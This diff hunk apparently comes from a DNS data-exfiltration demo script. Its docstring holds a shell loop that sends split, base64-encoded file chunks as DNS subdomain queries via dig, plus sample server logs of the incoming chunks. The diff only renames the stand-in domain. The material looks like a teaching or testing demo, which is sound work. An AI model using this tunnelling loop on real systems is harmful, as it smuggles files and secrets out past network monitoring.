@@ -44,16 +44,16 @@ if __name__ == "__main__":
     reactor.run()
  
 ''' 
-for i in $(ls xaa*);do DATA=$(cat $i | tr -d "="); dig -p 10053 @localhost $DATA.nth-block.hacker +short; done
+for i in $(ls xaa*);do DATA=$(cat $i | tr -d "="); dig -p 10053 @localhost $DATA.example.org +short; done
 
 NXP-MAC-J6YKRQ77W0:code nxp$ python3 dns-data-exfil/dns-server.py 
-Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.nth-block.hacker
-Incoming query for: H4sIAEoP92QAA+2TMQqAMAxFO3uKXECJNW3.nth-block.hacker
-Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.nth-block.hacker
-Incoming query for: 9r3w+uiSmKIiCiJoLdRqvDKM9+pyVCyMUoj.nth-block.hacker
-Incoming query for: YZIAradkiQAy6xzZ5mjnfIqIY2vuRzz/mV+.nth-block.hacker
-Incoming query for: 3gKXf0Kwa3AuVmw2++mv/5NhGKYUGwr9wK0.nth-block.hacker
-Incoming query for: ACgAA.nth-block.hacker
+Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.example.org
+Incoming query for: H4sIAEoP92QAA+2TMQqAMAxFO3uKXECJNW3.example.org
+Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.example.org
+Incoming query for: 9r3w+uiSmKIiCiJoLdRqvDKM9+pyVCyMUoj.example.org
+Incoming query for: YZIAradkiQAy6xzZ5mjnfIqIY2vuRzz/mV+.example.org
+Incoming query for: 3gKXf0Kwa3AuVmw2++mv/5NhGKYUGwr9wK0.example.org
+Incoming query for: ACgAA.example.org
 
 
 '''
